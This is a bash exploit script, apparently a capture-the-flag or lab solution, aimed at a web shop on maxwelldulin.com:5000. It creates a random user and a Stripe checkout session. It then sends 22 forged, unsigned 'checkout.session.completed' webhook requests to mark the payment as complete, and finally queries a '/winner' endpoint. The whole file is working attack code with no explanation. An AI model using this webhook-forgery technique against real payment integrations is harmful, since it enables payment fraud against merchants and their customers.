#!/bin/bash 

URL="maxwelldulin.com:5000"
USER=$(echo $RANDOM | md5sum | head -c 20; echo;)

echo "UserID: $USER" 
# Create a random user
curl -s -X POST http://$URL/login --data "{\"user\":\"$USER\"}" -H "Content-Type:application/json" > /dev/null

# Create a stripe interaction with our user
stripe_json=$(curl -s -X POST "http://$URL/stripe/$USER")
stripe_session=$(echo $stripe_json | jq '.redirect_url' -r)
id=$(echo $stripe_json | jq '.id' -r)

echo "Cart ID:" $id

# Perform this a bunch of times
for i in {1..22}
do
	curl -s -X POST "http://$URL/webhook" --data "{\"type\":\"checkout.session.completed\", \"data\" :{\"object\" : {\"metadata\" : {\"payment_id\" : $id}}}}" -H 'Content-Type: application/json' > /dev/null
done

echo 
echo 
echo 
curl "http://$URL/winner/$USER"




